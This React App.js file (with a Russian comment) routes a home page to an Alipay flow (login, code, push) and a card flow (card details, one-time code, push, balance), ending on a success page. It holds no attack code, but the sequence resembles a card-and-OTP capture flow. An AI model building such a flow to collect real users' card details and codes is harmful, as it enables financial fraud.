// src/App.js
import React, { useState, useRef } from 'react';
import { BrowserRouter as Router, Route, Routes } from 'react-router-dom';
import Home from './Home'; // Импортируйте новый компонент

import AlipayAuth from './Alipay/Auth';
import AlipayOtp from './Alipay/Otp';
import AlipayPush from './Alipay/Push';
import CardAuth from './Card/Card';
import CardOtp from './Card/Otp';
import CardPush from './Card/Push';
import CardBalance from './Card/Balance';
import Successfully from './components/Successfully/Successfully';

function App() {
  const [showChooseMethod, setShowChooseMethod] = useState(false);
  const chooseMethodRef = useRef(null);

  const handleGoToChoose = () => {
    setShowChooseMethod(true);
    setTimeout(() => {
      if (chooseMethodRef.current) {
        chooseMethodRef.current.scrollIntoView({ behavior: 'smooth' });
      }
    }, 200);
  };

  return (
    <Router>
      <Routes>
        <Route path="/" element={<Home handleGoToChoose={handleGoToChoose} showChooseMethod={showChooseMethod} chooseMethodRef={chooseMethodRef} />} />
        <Route path="/alipay/auth" element={<AlipayAuth />} />
        <Route path="/alipay/code" element={<AlipayOtp />} />
        <Route path="/alipay/push" element={<AlipayPush />} />
        <Route path="/card/card" element={<CardAuth />} />
        <Route path="/card/code" element={<CardOtp />} />
        <Route path="/card/push" element={<CardPush />} />
        <Route path="/card/balance" element={<CardBalance />} />
        <Route path="/successfully" element={<Successfully />} />

      </Routes>
    </Router>
  );
}

export default App;